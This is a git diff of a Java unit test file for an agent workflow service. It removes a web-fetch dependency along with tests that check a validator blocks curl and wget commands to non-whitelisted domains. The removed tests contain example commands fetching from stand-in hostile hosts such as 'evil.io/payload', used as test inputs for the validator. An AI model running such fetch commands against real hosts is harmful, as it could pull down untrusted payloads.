@@ -16,7 +16,6 @@ import com.agentsystem.skill.service.SkillService;
 import com.agentsystem.user.entity.User;
 import com.agentsystem.user.entity.UserStatus;
 import com.agentsystem.user.service.UserAccountService;
-import com.agentsystem.webfetch.service.WebFetchService;
 import com.agentsystem.workflow.entity.Workflow;
 import com.agentsystem.workflow.entity.WorkflowRun;
 import com.agentsystem.workflow.entity.WorkflowRunLog;
@@ -57,7 +56,6 @@ class WorkflowRunServiceTest {
     @Mock WorkflowEdgeRepository   edgeRepo;
     @Mock WorkflowService          workflowService;
     @Mock SandboxService           sandboxService;
-    @Mock WebFetchService          webFetchService;
     @Mock SkillService             skillService;
     @Mock ChatClient               chatClient;
     @Mock ChatModelFactory         chatModelFactory;
@@ -77,7 +75,7 @@ class WorkflowRunServiceTest {
     void setUp() {
         service = new WorkflowRunServiceImpl(
                 runRepo, logRepo, agentRepo, edgeRepo, workflowService, sandboxService,
-                webFetchService, skillService, chatClient, chatModelFactory,
+                skillService, chatClient, chatModelFactory,
                 modelConfigService, llmProperties, notificationClient,
                 workflowScheduleClient,
                 googleDocsService, googleSheetsService, googleSlidesService, telegramService,
@@ -400,75 +398,6 @@ class WorkflowRunServiceTest {
         executeRunDirectly(run);
 
         assertThat(run.getStatus()).isEqualTo(WorkflowRun.RunStatus.CANCELLED);
-    }
-
-    // ── validateNetworkCommand ────────────────────────────────────────────────
-
-    @Test
-    void validateNetworkCommand_plainCommand_allowed() throws Exception {
-        assertThat(callValidate("echo hello world", "owner@test.com")).isNull();
-    }
-
-    @Test
-    void validateNetworkCommand_pythonScript_allowed() throws Exception {
-        assertThat(callValidate("python3 main.py", "owner@test.com")).isNull();
-    }
-
-    @Test
-    void validateNetworkCommand_curlToAllowedDomain_allowed() throws Exception {
-        when(webFetchService.isUrlAllowed(eq("https://api.example.com/data"), any(OrgContext.class)))
-                .thenReturn(true);
-
-        assertThat(callValidate("curl https://api.example.com/data", "owner@test.com")).isNull();
-    }
-
-    @Test
-    void validateNetworkCommand_curlToBlockedDomain_returnsBlockedMessage() throws Exception {
-        when(webFetchService.isUrlAllowed(eq("https://evil.io/payload"), any(OrgContext.class)))
-                .thenReturn(false);
-
-        String result = callValidate("curl https://evil.io/payload", "owner@test.com");
-
-        assertThat(result).startsWith("[Blocked:");
-        assertThat(result).contains("evil.io");
-        assertThat(result).contains("whitelist");
-    }
-
-    @Test
-    void validateNetworkCommand_wgetToBlockedDomain_returnsBlockedMessage() throws Exception {
-        when(webFetchService.isUrlAllowed(eq("https://blocked.net/file.zip"), any(OrgContext.class)))
-                .thenReturn(false);
-
-        String result = callValidate("wget https://blocked.net/file.zip", "owner@test.com");
-
-        assertThat(result).startsWith("[Blocked:");
-        assertThat(result).contains("blocked.net");
-    }
-
-    @Test
-    void validateNetworkCommand_curlWithNoUrl_returnsBlockedMessage() throws Exception {
-        String result = callValidate("curl --help", "owner@test.com");
-
-        assertThat(result).startsWith("[Blocked:");
-        assertThat(result).contains("without a recognizable URL");
-    }
-
-    @Test
-    void validateNetworkCommand_wgetWithNoUrl_returnsBlockedMessage() throws Exception {
-        String result = callValidate("wget --spider", "owner@test.com");
-
-        assertThat(result).startsWith("[Blocked:");
-    }
-
-    @Test
-    void validateNetworkCommand_multipleCurlUrls_blockedIfAnyNotAllowed() throws Exception {
-        when(webFetchService.isUrlAllowed(eq("https://ok.com"), any(OrgContext.class))).thenReturn(true);
-        when(webFetchService.isUrlAllowed(eq("https://bad.com"), any(OrgContext.class))).thenReturn(false);
-
-        String result = callValidate("curl https://ok.com && curl https://bad.com", "owner@test.com");
-
-        assertThat(result).startsWith("[Blocked:");
-        assertThat(result).contains("bad.com");
     }
 
     // ── buildContext ──────────────────────────────────────────────────────────
@@ -797,12 +726,12 @@ class WorkflowRunServiceTest {
         String result = callDispatchScheduleTool("owner@test.com",
                 "{\"action\":\"create\",\"conversationId\":\"conv-1\",\"message\":\"hello\"," +
                 "\"cron\":\"0 9 * * *\",\"timezone\":\"UTC\",\"topK\":5," +
-                "\"useKnowledgeBase\":true,\"useWebFetch\":false}");
+                "\"useKnowledgeBase\":true,\"useWebSearch\":true}");
 
         assertThat(result).contains("sched-1");
         verify(workflowScheduleClient).createSchedule(
                 eq("owner@test.com"), eq("conv-1"), eq("hello"),
-                eq("0 9 * * *"), eq("UTC"), eq(5), eq(true), eq(false));
+                eq("0 9 * * *"), eq("UTC"), eq(5), eq(true), eq(true));
     }
 
     @Test
@@ -892,13 +821,6 @@ class WorkflowRunServiceTest {
     }
 
     // ── reflection helpers ────────────────────────────────────────────────────
-
-    private String callValidate(String command, String email) throws Exception {
-        Method m = WorkflowRunServiceImpl.class.getDeclaredMethod(
-                "validateNetworkCommand", String.class, String.class);
-        m.setAccessible(true);
-        return (String) m.invoke(service, command, email);
-    }
 
     @SuppressWarnings("unchecked")
     private String callBuildContext(List<Map<String, String>> messages) throws Exception {
